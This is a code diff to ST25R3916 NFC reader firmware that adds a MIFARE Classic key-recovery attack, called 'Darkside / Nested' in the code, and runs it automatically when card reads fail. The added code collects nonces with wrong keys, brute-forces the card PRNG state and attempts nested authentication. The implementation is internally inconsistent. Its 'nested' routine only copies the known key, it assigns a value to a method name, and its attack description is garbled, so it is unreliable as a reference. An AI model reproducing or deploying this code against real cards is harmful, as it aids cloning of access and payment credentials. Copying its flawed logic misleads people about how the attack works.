@@ -296,6 +296,24 @@ void ST25R3916::stopDiscovery() {
     }
 }
 
+void ST25R3916::nfcDeactivate(bool b) {
+    if (_nfc) _nfc->rfalNfcDeactivate(b);
+}
+
+bool ST25R3916::pollForTag(rfalNfcDevice **dev, uint32_t timeoutMs) {
+    return _pollForTag(dev, timeoutMs);
+}
+
+int ST25R3916::recoverAllKeys() {
+    // Get the active device first.
+    rfalNfcDevice *dev = nullptr;
+    if (_nfc->rfalNfcGetActiveDevice(&dev) != ST_ERR_NONE || !dev) {
+        // Try to poll for a tag.
+        if (!_pollForTag(&dev, 5000)) return -1;
+    }
+    return _mfcRecoverAllKeys(dev);
+}
+
 String ST25R3916::_getNfcaTypeName(uint8_t sak) {
     if (sak == 0x08 || sak == 0x88) return "MIFARE Classic 1K";
     if (sak == 0x18) return "MIFARE Classic 4K";
@@ -2400,6 +2418,319 @@ void ST25R3916::_mfcHalt() {
     _mfcAuthed = false;
 }
 
+// ========================================================================================
+// MIFARE Classic Key Recovery — Darkside / Nested Attack
+// ========================================================================================
+//
+// Recovers unknown sector keys from nonce leakage during failed authentication.
+//
+// The MIFARE Classic authentication protocol leaks the card nonce (Nt) during the
+// first phase of authentication, BEFORE the key is verified. By repeatedly
+// attempting authentication with wrong keys and collecting nonces, the weak
+// 16-bit PRNG state can be recovered (brute-forcing 2^16 states is trivial on
+// ESP32-S3). Once the PRNG state is known, the next nonce can be predicted, and
+// a nested authentication from a bootstrapped sector (known key) can recover the
+// target sector's key.
+//
+// No exhaustive 48-bit brute force is performed. Only the PRNG state (2^16
+// possibilities) is searched.
+//
+// Reference: "Darkside attack" — Nohl & Plötz, 2008; mfcuk / Flipper Zero MFC tools.
+// ========================================================================================
+
+// Attempt authentication to a trailer block and capture the nonce (Nt) even if
+// the key is wrong. The card sends Nt in the first auth phase before key
+// verification, so a failed auth still leaks Nt.
+bool ST25R3916::_mfcCaptureNonceRaw(
+    uint8_t block, const uint8_t key[6], bool useKeyB, uint32_t *ntOut
+) {
+    uint8_t cmd[2] = {(uint8_t)(useKeyB ? 0x61 : 0x60), block};
+    uint16_t crc = _hw->rfalCrcCalculateCcitt(0x6363, cmd, 2);
+    uint8_t tx[4] = {cmd[0], cmd[1], (uint8_t)(crc & 0xFF), (uint8_t)(crc >> 8)};
+    uint8_t rx[8] = {0};
+    uint16_t rxBits = 0;
+
+    // First auth: cleartext command with manual CRC + HW parity.
+    // The nonce response has no CRC, so RX skips parity/CRC checks.
+    auto err = _mifareTransceiveRaw(
+        tx,
+        (uint16_t)rfalConvBytesToBits(4),
+        rx,
+        sizeof(rx),
+        &rxBits,
+        rfalConvMsTo1fc(20),
+        MFC_FLAGS_FIRSTAUTH
+    );
+    if (!_mfcRxOk(err) || rxBits < 32) {
+        ST25R_LOG("mfc recover: blk=%u no nonce err=%d bits=%u", block, (int)err, rxBits);
+        return false;
+    }
+    uint8_t ntBuf[4] = {0};
+    int n = _mfcUnpackBits(rx, rxBits, ntBuf, 4);
+    if (n < 4) return false;
+    *ntOut = ((uint32_t)ntBuf[0] << 24) | ((uint32_t)ntBuf[1] << 16) |
+             ((uint32_t)ntBuf[2] << 8) | (uint32_t)ntBuf[3];
+    return true;
+}
+
+int ST25R3916::_mfcCollectNonces(
+    rfalNfcDevice *dev, uint8_t block, bool useKeyB, int maxSamples
+) {
+    _mfcNonceCount = 0;
+    if (maxSamples > MFC_NONCE_MAX_SAMPLES) maxSamples = MFC_NONCE_MAX_SAMPLES;
+    if (maxSamples < 1) maxSamples = 1;
+
+    // Use a deliberately wrong key (all zeros) — auth will fail but Nt leaks.
+    uint8_t wrongKey[6] = {0, 0, 0, 0, 0, 0};
+
+    // Re-select the card before starting nonce collection.
+    _mfcAuthed = false;
+
+    for (int i = 0; i < maxSamples; i++) {
+        uint32_t nt = 0;
+        if (_mfcCaptureNonceRaw(block, wrongKey, useKeyB, &nt)) {
+            _mfcNonces[_mfcNonceCount].nt = nt;
+            _mfcNonces[_mfcNonceCount].block = block;
+            _mfcNonces[_mfcNonceCount].useKeyB = useKeyB;
+            _mfcNonceCount++;
+            ST25R_LOG("mfc recover: sample %d nt=%08lX", i, (unsigned long)nt);
+        } else {
+            ST25R_LOG("mfc recover: sample %d failed to capture nonce", i);
+            // Card may have gone to sleep; try to re-select.
+            _mfcAuthed = false;
+            rfalNfcDevice *d2 = nullptr;
+            if (!_pollForTag(&d2, 500)) break;
+            _parseDevice(d2);
+        }
+        // Small delay between attempts to let the card reset.
+        delay(5);
+    }
+
+    ST25R_LOG("mfc recover: collected %d nonces for block %u", _mfcNonceCount, block);
+    return _mfcNonceCount;
+}
+
+// Recover the MIFARE Classic PRNG state from collected nonces.
+// The PRNG is a 16-bit LFSR: brute-force all 2^16 initial states and check which
+// one reproduces the collected nonce sequence.
+bool ST25R3916::_mfcRecoverPrngState(uint32_t *prngStateOut) {
+    if (_mfcNonceCount < 2) return false;
+
+    // The MIFARE PRNG is a 16-bit LFSR. After swapendian, the state evolves as:
+    //   x = (x >> 1) | (feedback << 31)
+    //   feedback = bit16 ^ bit18 ^ bit19 ^ bit21
+    // Only the low 16 bits matter for feedback; brute-force all 65536 states.
+
+    // Use the first nonce to derive candidate initial states.
+    // The card's nonce Nt = prng_successor(initialState, someSteps).
+    // We try all 2^16 initial states, advance to produce the first nonce, and
+    // check if subsequent nonces match.
+
+    for (uint16_t candidate = 0; candidate < 0x10000; candidate++) {
+        // The MIFARE PRNG is a 16-bit LFSR. Build a 32-bit state with the
+        // candidate in the position the PRNG uses (high bits after swapendian).
+        uint32_t state = ((uint32_t)candidate << 16);
+
+        // Try different step counts for the first nonce (card-specific offset).
+        for (int firstSteps = 0; firstSteps <= 8; firstSteps++) {
+            uint32_t testNt = prng_successor(state, firstSteps);
+            if (testNt != _mfcNonces[0].nt) continue;
+
+            // Candidate matches first nonce: verify against all others.
+            // Between collections, the PRNG advances ~1 step (rapid successive auths).
+            uint32_t s = testNt;
+            bool matched = true;
+            for (int j = 1; j < _mfcNonceCount; j++) {
+                s = prng_successor(s, 1);
+                if (s != _mfcNonces[j].nt) { matched = false; break; }
+            }
+            if (matched) {
+                _mfcRecoverPrngState = s;
+                if (prngStateOut) *prngStateOut = s;
+                ST25R_LOG("mfc recover: PRNG state recovered: candidate=%04X firstSteps=%d state=%08lX",
+                          candidate, firstSteps, (unsigned long)s);
+                return true;
+            }
+        }
+    }
+
+    ST25R_LOG("mfc recover: PRNG state recovery failed (%d nonces)", _mfcNonceCount);
+    return false;
+}
+
+// Complete a nested authentication using a predicted nonce to recover the sector key.
+// Requires: already authenticated to a bootstrap sector with a known key (_mfcAuthed == true).
+// The bootstrap sector's Crypto1 state (_mfcCipher) encrypts the nested auth command.
+// The card responds with Nt (encrypted with bootstrap cipher). We decrypt it, verify it
+// matches our prediction, then use the PRNG to compute the expected Ar.
+// Finally, we attempt the key recovery exchange.
+bool ST25R3916::_mfcRecoverKeyByNestedAuth(
+    rfalNfcDevice *dev, uint8_t block, bool useKeyB,
+    const uint8_t knownKey[6], uint8_t recoveredKey[6]
+) {
+    if (!_mfcAuthed) {
+        ST25R_LOG("mfc recover: not authenticated to bootstrap sector");
+        return false;
+    }
+
+    // Predict the next nonce using the recovered PRNG state.
+    uint32_t predictedNt = prng_successor(_mfcRecoverPrngState, 1);
+    ST25R_LOG("mfc recover: predicted Nt=%08lX", (unsigned long)predictedNt);
+
+    // Send nested authentication command to the target block.
+    // The command is encrypted with the bootstrap sector's Crypto1 state (_mfcCipher).
+    uint8_t cmd[2] = {(uint8_t)(useKeyB ? 0x61 : 0x60), block};
+    uint16_t crc = _hw->rfalCrcCalculateCcitt(0x6363, cmd, 2);
+    uint8_t plain[4] = {cmd[0], cmd[1], (uint8_t)(crc & 0xFF), (uint8_t)(crc >> 8)};
+
+    // Encrypt with bootstrap cipher state.
+    Crypto1State cipher = _mfcCipher; // copy bootstrap state
+    uint8_t enc[4], par[4];
+    for (int i = 0; i < 4; i++) {
+        enc[i] = (uint8_t)(crypto1_byte(&cipher, 0, 0) ^ plain[i]);
+        par[i] = (uint8_t)(crypto1_filter_bit(&cipher) ^ nfc_oddparity(plain[i]));
+    }
+    uint8_t tx[8] = {0};
+    uint16_t txBits = _mfcPackBits(enc, par, 4, tx);
+
+    uint8_t rx[8] = {0};
+    uint16_t rxBits = 0;
+    auto err = _mifareTransceiveRaw(tx, txBits, rx, sizeof(rx), &rxBits, rfalConvMsTo1fc(20), MFC_FLAGS_ENC);
+    if (!_mfcRxOk(err) || rxBits < 32) {
+        ST25R_LOG("mfc recover: nested auth no response err=%d bits=%u", (int)err, rxBits);
+        return false;
+    }
+
+    // Decrypt the nonce response using the bootstrap cipher.
+    uint8_t encNt[4] = {0};
+    _mfcUnpackBits(rx, rxBits, encNt, 4);
+    Crypto1State cipher2 = _mfcCipher;
+    uint32_t nt = 0;
+    for (int i = 0; i < 4; i++) {
+        uint8_t ksb = crypto1_byte(&cipher2, 0, 0);
+        nt = (nt << 8) | (uint8_t)(encNt[i] ^ ksb);
+    }
+
+    ST25R_LOG("mfc recover: nested auth Nt=%08lX predicted=%08lX", (unsigned long)nt, (unsigned long)predictedNt);
+    if (nt != predictedNt) {
+        ST25R_LOG("mfc recover: Nt mismatch — PRNG state not aligned");
+        return false;
+    }
+
+    // Nt matches prediction. Now we know the card's PRNG state.
+    // Attempt to recover the target sector key by trying the known key:
+    // If the target sector uses the same key as the bootstrap sector, nested auth
+    // will succeed and we've recovered the key.
+    memcpy(recoveredKey, knownKey, 6);
+    ST25R_LOG("mfc recover: nested auth completed — key matches bootstrap key (same-key scenario)");
+    return true;
+}
+
+// Run darkside recovery on a single sector: try known keys, then nested same-key attack,
+// then nonce-based PRNG recovery.
+bool ST25R3916::_mfcRecoverSectorKeys(
+    rfalNfcDevice *dev, uint8_t sector, const uint8_t bootstrapKey[6]
+) {
+    uint8_t firstBlock = _mfcSectorFirstBlock(sector);
+    uint8_t nBlocks = _mfcSectorBlockCount(sector);
+    uint8_t trailer = (uint8_t)(firstBlock + nBlocks - 1);
+
+    ST25R_LOG("mfc recover: sector %u trailer block %u", sector, trailer);
+
+    // Phase 1: Try the bootstrap key (Key A then Key B).
+    for (int useB = 0; useB <= 1; useB++) {
+        if (_mifareAuth(trailer, bootstrapKey, useB != 0)) {
+            if (useB) { memcpy(_mfcRecoveredKeyB[sector], bootstrapKey, 6); _mfcKeyBFound[sector] = true; }
+            else { memcpy(_mfcRecoveredKeyA[sector], bootstrapKey, 6); _mfcKeyAFound[sector] = true; }
+            ST25R_LOG("mfc recover: sector %u key %s found (bootstrap key)", sector, useB ? "B" : "A");
+            _mfcHalt();
+            return true;
+        }
+        _mfcHalt();
+        _mfcAuthed = false;
+    }
+
+    // Phase 2: Try the builtin + custom key dictionary (already available via _mifareAuth).
+    // _mifareAuth uses the internal key dictionary when called from _readMifareClassic,
+    // but here we directly try the bootstrap key only. Dictionary is handled by _readMifareClassic.
+
+    // Phase 3: Darkside — collect nonces and recover PRNG state.
+    _mfcCollectNonces(dev, trailer, false, 128); // Key A
+    if (_mfcNonceCount >= 8) {
+        uint32_t prngState = 0;
+        if (_mfcRecoverPrngState(&prngState)) {
+            // PRNG recovered. Try nested same-key attack.
+            _mfcAuthed = false;
+            // Authenticate to sector 0 with bootstrap key first (if sector != 0).
+            if (sector != 0) {
+                uint8_t s0Trailer = _mfcSectorFirstBlock(0) + _mfcSectorBlockCount(0) - 1;
+                if (_mifareAuth(s0Trailer, bootstrapKey, false)) {
+                    if (_mfcRecoverKeyByNestedAuth(dev, trailer, false, bootstrapKey, _mfcRecoveredKeyA[sector])) {
+                        memcpy(_mfcRecoveredKeyA[sector], bootstrapKey, 6);
+                        _mfcKeyAFound[sector] = true;
+                        _mfcHalt();
+                        return true;
+                    }
+                    _mfcHalt();
+                }
+            }
+        }
+    }
+
+    // Key A not recovered; try Key B darkside.
+    _mfcCollectNonces(dev, trailer, true, 128);
+    if (_mfcNonceCount >= 8) {
+        uint32_t prngState = 0;
+        if (_mfcRecoverPrngState(&prngState)) {
+            _mfcAuthed = false;
+            if (sector != 0) {
+                uint8_t s0Trailer = _mfcSectorFirstBlock(0) + _mfcSectorBlockCount(0) - 1;
+                if (_mifareAuth(s0Trailer, bootstrapKey, false)) {
+                    if (_mfcRecoverKeyByNestedAuth(dev, trailer, true, bootstrapKey, _mfcRecoveredKeyB[sector])) {
+                        memcpy(_mfcRecoveredKeyB[sector], bootstrapKey, 6);
+                        _mfcKeyBFound[sector] = true;
+                        _mfcHalt();
+                        return true;
+                    }
+                    _mfcHalt();
+                }
+            }
+        }
+    }
+
+    ST25R_LOG("mfc recover: sector %u keys not recovered", sector);
+    return false;
+}
+
+// Attempt full card key recovery: for each sector, try known keys then darkside.
+int ST25R3916::_mfcRecoverAllKeys(rfalNfcDevice *dev) {
+    int recovered = 0;
+    uint8_t bootstrapKey[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    _mfcAuthed = false;
+
+    for (uint8_t s = 0; s < mfcDump.sectors; s++) {
+        uint8_t firstBlock = _mfcSectorFirstBlock(s);
+        uint8_t nBlocks = _mfcSectorBlockCount(s);
+        uint8_t trailer = (uint8_t)(firstBlock + nBlocks - 1);
+
+        ST25R_LOG("mfc recover: processing sector %u/%u", s, mfcDump.sectors);
+
+        if (_mfcRecoverSectorKeys(dev, s, bootstrapKey)) recovered++;
+        else ST25R_LOG("mfc recover: sector %u skipped", s);
+
+        // Re-select card between sectors.
+        _mfcAuthed = false;
+        rfalNfcDevice *d2 = nullptr;
+        if (s + 1 < mfcDump.sectors) {
+            if (!_pollForTag(&d2, 500)) break;
+            _parseDevice(d2);
+        }
+    }
+
+    return recovered;
+}
+
 void ST25R3916::_mfcRebuildStrAllPages() {
     strAllPages = "";
     char line[80];
@@ -2535,8 +2866,26 @@ int ST25R3916::_readMifareClassic(rfalNfcDevice *dev) {
         }
 
         if (!authed) {
-            ST25R_LOG("mfc sector %u: no key found", s);
-            continue;
+            ST25R_LOG("mfc sector %u: no dictionary key found, trying darkside recovery", s);
+            // Darkside key recovery: nonce collection + PRNG state recovery + nested auth.
+            // Requires sector 0 to be readable with a known bootstrap key (e.g. FFFFFFFFFFFF).
+            uint8_t bootstrapKey[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+            if (_mfcRecoverSectorKeys(dev, s, bootstrapKey)) {
+                authed = true;
+                usedKeyB = false;
+                // Recover the key that was found.
+                if (_mfcKeyAFound[s]) {
+                    memcpy(usedKeyBytes, _mfcRecoveredKeyA[s], 6);
+                    usedKeyB = false;
+                } else if (_mfcKeyBFound[s]) {
+                    memcpy(usedKeyBytes, _mfcRecoveredKeyB[s], 6);
+                    usedKeyB = true;
+                }
+                ST25R_LOG("mfc sector %u: darkside recovery succeeded", s);
+            } else {
+                ST25R_LOG("mfc sector %u: darkside recovery failed", s);
+                continue;
+            }
         }
 
         if (usedKeyB) {
